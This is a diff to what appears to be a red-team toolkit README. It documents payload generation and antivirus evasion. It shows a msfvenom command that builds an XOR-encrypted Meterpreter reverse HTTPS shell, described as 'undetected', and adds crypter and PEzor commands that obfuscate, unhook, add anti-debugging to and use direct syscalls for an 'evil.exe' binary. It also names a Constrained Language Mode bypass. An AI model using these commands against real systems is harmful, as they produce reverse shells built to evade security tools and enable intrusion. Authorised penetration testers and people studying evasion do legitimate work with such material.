@@ -46,7 +46,15 @@ Download to disk and run - this is undetected.
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key w -o shell.cs
 2. Place inside and compile it.
 ```
-* ConfuserEX.zip - for PE obfuscation.
+* ConfuserEX.zip - for .NET PE obfuscation.
+* Hyperion.zip - Crypter for PE obfuscation.
+```
+hyperion.exe input.exe output.exe
+```
+* [Pezor](https://github.com/Karmaz95/PEzor)
+```
+bash PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 evil.exe -z 2
+```
 * bypass-clm.exe - [CLM Bypass](https://github.com/Karmaz95/bypass-clm) => spawn PowerShell in current terminal.
 * clm_enc.txt - Same as bypass-clm.exe but base64 encoded with certutil and you can pass b64 encoded commands:
 ```
